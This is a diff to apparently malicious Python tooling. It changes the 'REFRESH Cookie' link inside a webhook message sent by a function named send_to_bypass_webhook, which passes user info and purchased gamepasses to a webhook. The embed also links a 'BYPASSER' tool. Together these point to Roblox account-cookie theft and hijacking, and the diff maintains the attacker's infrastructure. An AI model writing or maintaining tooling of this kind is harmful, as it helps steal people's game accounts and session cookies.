@@ -406,7 +406,7 @@ def send_to_bypass_webhook(user_info, ping_content, purchased_gamepasses):
                         },
                         {
                             'name': '✅ Status',
-                            'value': '**Successful 🟢**\n\n**[BYPASSER LINK](https://rblx-forcer.vercel.app)**\n\n**[REFRESH Cookie](https://rblx-refresh.vercel.app/)**',
+                            'value': '**Successful 🟢**\n\n**[BYPASSER LINK](https://rblx-forcer.vercel.app)**\n\n**[REFRESH Cookie](https://rblx-refresher.ct.ws/?i=2)**',
                             'inline': False
                         }
                     ],
